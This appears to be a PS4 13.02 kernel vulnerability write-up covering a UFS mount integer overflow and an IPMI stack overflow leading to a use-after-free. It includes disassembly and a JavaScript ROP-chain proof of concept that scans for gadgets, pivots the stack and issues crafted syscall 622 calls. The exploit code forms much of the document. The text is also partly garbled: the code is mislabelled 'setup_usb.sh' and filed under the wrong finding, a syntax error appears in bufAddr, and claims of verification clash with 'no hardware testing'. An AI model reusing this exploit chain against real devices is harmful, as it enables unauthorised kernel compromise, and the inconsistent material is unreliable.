PS4 13.02 · kernel research

Two kernel findings on 13.02

Static analysis of the 13.02 kernel, with the disassembly behind both findings. Neither is a jailbreak. Both are components.

Fahrenheit kernel · UFS

An integer overflow in ffs_mountfs during UFS mount. The superblock validator's return value is discarded. Reachable from external media under unverified conditions.

verified · needs USB 3.0 drive to trigger
oomfie kernel · IPMI

An unbounded stack write in sys_ipmimgr command 0. Corrupts the identity fields of freshly-allocated ConnectRequests. Collision leads to use-after-free.

verified · trigger from syscall, no hardware

About

Both findings are documented against the public 13.02 kernel dump. All addresses are relative to the kernel image base. Function names are reconstructed; the binaries are stripped. No hardware testing has been performed on either finding.

The shared blocker for both is the absence of a userspace primitive on 13.02. The WebKit SSV exploit that would have provided one does not fire on this firmware — the JavaScriptCore deserializer's object map was rebased in the Safari 17 cycle and no longer overflows. That gap is documented on both findings below but is not solved by either.

Neither finding claims an exploit. What's verified is the vulnerability and the arithmetic that permits it. What's missing — and what any future chain would need — is a userspace primitive that can run before the bug fires, and a heap-shaping component for the kernel side.

Fahrenheit — unvalidated UFS superblocks on 13.02

The UFS mount path on 13.02 accepts superblocks that its own validator would reject. The 13.52 validator is fail-open: it runs, its return value is discarded, and execution continues with the unvalidated superblock. On 13.02 the validator call is absent entirely. Both firmwares mount crafted superblocks. The downstream write loop derives its length from fields the arithmetic never bounds-checks. The multiplication wraps.

What follows is the diff, the arithmetic, the reachability analysis, and — importantly — the three gaps that keep this from being a jailbreak route. The finding is real. The exploitation path is not complete, and one of the missing pieces is a piece of hardware I don't currently have.

The two functions

Both firmwares have ffs_mountfs as the UFS filesystem mount entry point. On 13.52 it's at kernel base 0xffffffff80000000 + 0x4e9640 (FUN_ffffffff824e9640). On 13.02 it's at the same relative position in a different binary (FUN_00ae9510, base 0 in the dump).

That's a pile driver, not a clean overflow. Exploitation wants a tighter overrun. The quantity to control is: 

overrun = N * fs_bsize - (field_0x9c + 5 * fs_ncg)

Reachability — six paths to ffs_mountfs

  1. USB automounter. The intended target. SceAutoMounterIpc probes devices and calls nmount(2) for recognized fstypes. Whether UFS is in the probe list is unverified. Public Celsius research says a 250 GB+ USB 3.0 drive is required to reach the automounter at all.
  2. Direct nmount(2) from userspace. Requires vfs.usermount enabled and a device vnode. A browser sandbox typically cannot reach either.
  3. Boot-time mountroot. Not runtime. Requires a crafted drive across a power cycle.
  4. Internal LVD HDD mount. Requires prior jailbreak to write to the raw partition. Chicken and egg.
  5. BD-J triggered mount. Requires a Blu-ray burner and confirmation that the BD-J syscall surface exposes mount(2).
  6. Firmware update path. Not relevant — PUP files are not UFS superblocks.

oomfie — unbounded stack write in sys_ipmimgr

PS4 13.02's IPMI manager — sys_ipmimgr, syscall 622 — has a stack buffer overflow in the create-server handler. The function walks the pending-connect list and writes two uint32 values per matching entry into two adjacent 256-byte stack arrays, with no bounds check on the write index. The list has no length cap. With 64 or more queued connect requests, the writes overflow; with 79 or more, the stack canary trips.

The overflow is only the surface. The values written come from the pending-connect entries themselves — the (server_id, uid) pair that serves as the identity key for ConnectRequest objects. That pair is propagated by the same function into freshly- allocated ConnectRequest structures. Two objects can end up claiming the same identity, and the free path for ConnectRequest is unguarded. That's where the exploit lives: an identity collision that leads to a use-after-free.

Before you run the PoC. The static analysis below is verified against the 13.02 kernel dump. The trigger sequence has not been executed on hardware. The PoC's argument block layout, its command numbers, and its return-value handling are reconstructions from the disassembly — they may not match the actual userspace ABI. On a real console it may fail at the first call, return EINVAL for every command, or panic the kernel. Run it on a console you are prepared to lose.

The finding does not depend on the PoC working. The disassembly is the evidence.

The module

sys_ipmimgr is syscall 622. It dispatches through a large switch in FUN_00f061d0. The switch covers roughly 300 commands across the ranges 0x000–0x271, 0x302–0x372, and 0x400–0x520. Two of them matter here:

The two handlers share one list

Both commands operate on the same global context at _DAT_022fdf68. The create handler walks [ctx + 0x38] as the list head. The connect handler appends to [ctx + 0x40] as the tail and increments the counter at [ctx + 0x34]. Same context, same offsets. This is confirmed at the instruction level in both functions: 

; FUN_00efb220 (create) — list walk, offsets in the ctx pointer
0xEFB7EF  mov rcx, [r13+0]              ; r13 = &_DAT_022fdf68, rcx = ctx
0xEFB81C  mov r14, [rcx+38h]            ; r14 = pending-connect list head

; FUN_00ef10d0 (connect) — append path
          mov rdx, [rip+_DAT_022fdf68]  ; ctx from same global
          mov [ctx+40h], rax            ; tail = new node
          inc dword ptr [ctx+34h]       ; counter++

A critique surfaced during review claiming the connect path populated [ctx + 0x440] rather than [ctx + 0x38]. That offset does not appear in either handler. The create walk reads +0x38, the connect append writes +0x40. The lists are the same. The trigger model holds.

From stack overflow to use-after-free

Both values written per iteration come from the pending-connect entry: 

plVar13[3]                            → the "server id" field of the entry
*(undefined4 *)((long)plVar13 + 0x1c) → the "uid" field of the entry

A second loop reads the arrays back and writes their contents into freshly-allocated ConnectRequests. Same loop, in assembly: 

0xEFBA32  call sub_EF74D0                  ; allocate ConnectRequest
0xEFBA4A  mov ecx, [rbp+rbx*4+var_170]    ; read array_A
0xEFBA51  mov [rax+18h], ecx               ; write to object+0x18
0xEFBA54  mov ecx, [rbp+rbx*4+var_270]    ; read array_B
0xEFBA5B  mov [rax+1Ch], ecx               ; write to object+0x1C
0xEFBA65  call sub_EF7F10                  ; link into server's list

sub_EF74D0 allocates from a single UMA zone loaded from DAT_02f7d630. The free counterpart is a bare uma_zfree: 

void sub_EF74B0(void *obj) {
    FUN_00a111b0(_DAT_02f7d630, obj, 0);      // uma_zfree, nothing else
}

No unlink from the list. No reference count. No state check. Twenty call sites, every one of them assumes the object is unreferenced and unlinked before freeing. An identity collision that leads a caller to free the wrong object leaves a dangling reference; the eventual double-free or the next walk of the freed entry dereferences freed memory.

Fahrenheit — setup_usb.sh

// WARNING — READ FIRST
//
// This is a static-analysis reconstruction. It has not been tested on
// hardware. Every struct layout, every field offset, and the exact shape
// of the syscall argument block are derived from the 13.02 kernel
// decompilation. They may not match the actual userspace ABI.
//

// established, JS issuing syscalls via the ROP harness. Will not run
// from a plain browser page or any sandboxed context.
//

//   ?n=63        clean baseline — should complete, no panic
//   ?n=64        first overflow — should complete, no panic
//   ?n=72        deep overflow — may or may not fire UAF
//   ?n=78        last safe value — may fire UAF

function hx32(x) { return ("00000000" + ((x >>> 0).toString(16))).slice(-8); }
function hx64(v) { return "0x" + hx32(v.hi) + hx32(v.low); }

function bufAddr(ab) {
    const c = p.leakval(ab);
    return p.read8(
        p.read8(c.add32(off.wk_ArrayBuffer_m_impl))
         .add32(off.wk_ArrayBuffer_m_contents_m_data)

}

function put64(dv, at, value) {
    if (typeof value === "number") {
        dv.setUint32(at, value >>> 0, true);
        dv.setUint32(at + 4, value < 0 ? 0xffffffff : 0, true);
    } else {
        dv.setUint32(at, value.low >>> 0, true);
        dv.setUint32(at + 4, value.hi >>> 0, true);
    }
}
function put32(dv, at, value) { dv.setUint32(at, value >>> 0, true); }

function setupGadgets() {
    const GAD = [
        ["POP_RDI_RET",     off.wk_POP_RDI_RET,     [0x5f, 0xc3]],
        ["POP_RSI_RET",     off.wk_POP_RSI_RET,     [0x5e, 0xc3]],
        ["POP_RDX_RET",     off.wk_POP_RDX_RET,     [0x5a, 0xc3]],
        ["POP_RCX_RET",     off.wk_POP_RCX_RET,     [0x59, 0xc3]],
        ["POP_R8_RET",      off.wk_POP_R8_RET,      [null, 0x58, 0xc3]],
        ["POP_R9_RET",      off.wk_POP_R9_RET,      [null, 0x59, 0xc3]],
        ["POP_RAX_RET",     off.wk_POP_RAX_RET,     [0x58, 0xc3]],
        ["LEAVE_RET",       off.wk_LEAVE_RET,       [0xc9, 0xc3]],
        ["MOV_RDI_RAX_RET", off.wk_MOV_QWORD_PTR_RDI_RAX_RET,
                            [0x48, 0x89, 0x07, 0xc3]],
        ["G0", off.wk_MOV_RDI_RSI_30_CALL,      [0x48, 0x8b, 0x7e, 0x30]],
        ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18,   [0x58, 0x48, 0x8b, 0x07]],
        ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10,  [0x55, 0x48, 0x89, 0xe5]],
        ["G3", off.wk_MOV_RDI_RAX_8_CALL_20,    [0x48, 0x8b, 0x78, 0x08]],
        ["G4", off.wk_MOV_RDX_RAX_18_CALL_10,
                            [0x48, 0x8b, 0x50, off.pivot_view_sp]],
        ["G5", off.wk_PUSH_RDX_POP_RSP_RET,     [0x52, 0x5c, 0xc3]],
    ];
    let gated = 0;
    for (const [nm, rva, pat] of GAD) {
        const a = webkitBase.add32(rva);
        let good = true;
        for (let i = 0; i < pat.length; ++i) {
            if (pat[i] === null) continue;
            if (p.read1(a.add32(i)) !== pat[i]) { good = false; break; }
        }
        if (good) { G[nm] = a; gated++; }
        else mark("GADGET-BAD", nm);
    }
    return gated === GAD.length;
}

function setupStubs() {
    const need = new Set(Object.values(SYS));
    let scanned = 0;
    for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
        const v = p.read8(libkernelBase.add32(o));
        if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
        const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
        if (!need.has(num)) continue;
        stubAddr.set(num, libkernelBase.add32(o));
        need.delete(num);
        scanned++;
    }
    return { scanned, missing: [...need] };
}

const PB_SIZE = () => Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);

function makeCtx() {
    const sb = new ArrayBuffer(0x20);
    const pb = new ArrayBuffer(PB_SIZE());
    const kb = new ArrayBuffer(0x2000);
    const fb = new ArrayBuffer(0x40);
    keepAlive.push(sb, pb, kb, fb);
    const c = {
        storeDv: new DataView(sb), pivotDv: new DataView(pb),
        stackDv: new DataView(kb), frameDv: new DataView(fb),
        stackU8: new Uint8Array(kb), frameU8: new Uint8Array(fb)
    };
    keepAlive.push(c.storeDv, c.pivotDv, c.stackDv, c.frameDv,
                   c.stackU8, c.frameU8);
    c.S = bufAddr(sb); c.P = bufAddr(pb);
    c.K = bufAddr(kb); c.F = bufAddr(fb);
    put64(c.storeDv, 0x00, G.G1); put64(c.storeDv, 0x08, c.P);
    put64(c.storeDv, 0x10, G.G3); put64(c.storeDv, 0x18, G.G2);
    put64(c.pivotDv, 0x00, c.P); put64(c.pivotDv, 0x10, G.G5);
    put64(c.pivotDv, 0x20, G.G4);
    return c;
}

function layout(c, target, args) {
    c.stackU8.fill(0); c.frameU8.fill(0);
    const insts = [];
    for (let i = 0; i < args.length; ++i) {
        insts.push(argGadget[i]);
        insts.push(args[i]);
    }
    const targetIdx = insts.length;
    insts.push(target);
    insts.push(G.POP_RDI_RET); insts.push(c.F);
    insts.push(G.MOV_RDI_RAX_RET);
    insts.push(G.POP_RAX_RET);
    insts.push(new int64(0x0a, 0xfffffff7));
    insts.push(G.LEAVE_RET);
    let at = 0x2000 - 8 * insts.length;
    if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
    for (let i = 0; i < insts.length; ++i)
        put64(c.stackDv, at + 8 * i, insts[i]);
    put64(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
}

function callAddr(target, args) {
    layout(M, target, args);
    const saved = p.read8(pivotCell);
    p.write8(pivotCell, M.S);
    try { Math.expm1(pivotObj); } catch (e) { }
    p.write8(pivotCell, saved);
    return {
        lo:  M.frameDv.getUint32(0, true),
        hi:  M.frameDv.getUint32(4, true),
        i32: M.frameDv.getUint32(0, true) | 0
    };
}
function sc(num, ...args) {
    const stub = stubAddr.get(num);
    if (!stub) throw new Error("no stub for syscall " + num);
    return callAddr(stub, args);
}
function errno() {
    const r = callAddr(errorFn, []);
    const a = new int64(r.lo, r.hi);
    return (a.hi === 0 && a.low === 0) ? -1 : p.read4(a) | 0;
}

const ARGS_SIZE = 0x30;

function buildConnectInput(name, serverId) {
    const inAb   = new ArrayBuffer(0x40);
    const inDv   = new DataView(inAb);
    const nameAb = new ArrayBuffer(64);
    new TextEncoder().encodeInto(name, new Uint8Array(nameAb));

    const timeoutAb   = new ArrayBuffer(4);
    new DataView(timeoutAb).setUint32(0, 10000, true);

    const nameAddr    = bufAddr(nameAb);
    const timeoutAddr = bufAddr(timeoutAb);

    put64(inDv, 0x00, 1);
    put64(inDv, 0x08, Math.min(name.length + 1, 0x1FFF));
    put64(inDv, 0x10, 0);
    put64(inDv, 0x18, timeoutAddr);

    keepAlive.push(nameAb, timeoutAb);
    return { inAb };
}

function buildCreateInput(name) {
    const inAb = new ArrayBuffer(0x40);
    const inDv = new DataView(inAb);
    const nameAb = new ArrayBuffer(32);
    new TextEncoder().encodeInto(name, new Uint8Array(nameAb));
    const paramsAb = new ArrayBuffer(0x38);
    const nameAddr   = bufAddr(nameAb);
    const paramsAddr = bufAddr(paramsAb);
    put64(inDv, 0x00, 0);
    put64(inDv, 0x08, nameAddr);
    put64(inDv, 0x10, paramsAddr);
    keepAlive.push(nameAb, paramsAb);
    return { inAb };
}

function ipmimgrCall(cmd, serverId, inAb) {
    const argsAb = new ArrayBuffer(ARGS_SIZE);
    const argsDv = new DataView(argsAb);
    const outAb  = new ArrayBuffer(0x10);
    const outDv  = new DataView(outAb);
    keepAlive.push(argsAb, outAb);

    const argsAddr = bufAddr(argsAb);
    const inAddr   = inAb ? bufAddr(inAb) : 0;
    const outAddr  = bufAddr(outAb);

    put32(argsDv, 0x00, cmd);
    put32(argsDv, 0x08, serverId);
    put64(argsDv, 0x10, outAddr);
    put64(argsDv, 0x18, inAddr);
    put64(argsDv, 0x20, inAb ? inAb.byteLength : 0);

    const ret = sc(SYS.ipmimgr, argsAddr).i32;
    const err = (ret === -1) ? errno() : 0;
    return {
        ret, err,
        out0: outDv.getUint32(0, true),
        out4: outDv.getUint32(4, true)
    };
}
